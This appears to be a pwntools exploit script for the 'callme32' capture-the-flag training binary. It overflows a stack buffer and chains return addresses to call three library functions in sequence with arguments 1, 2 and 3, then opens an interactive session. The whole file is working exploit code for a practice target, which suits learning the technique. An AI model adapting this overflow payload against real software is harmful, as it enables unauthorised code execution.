from pwn import *

callme32 = process('callme32')
callme32.recv()

_main = p32(0x0804873b)
_one = p32(0x080485c0)
_two = p32(0x08048620)
_three = p32(0x080485b0)

_arg1 = p32(1)
_arg2 = p32(2)
_arg3 = p32(3)

def send(func):
    payload = b"A" * 40
    payload += b"EBP4"
    payload += func
    payload += _main
    payload += _arg1
    payload += _arg2
    payload += _arg3
    
    callme32.sendline(payload)
    
send(_one)
callme32.recv()

send(_two)
callme32.recv()

send(_three)
callme32.interactive()
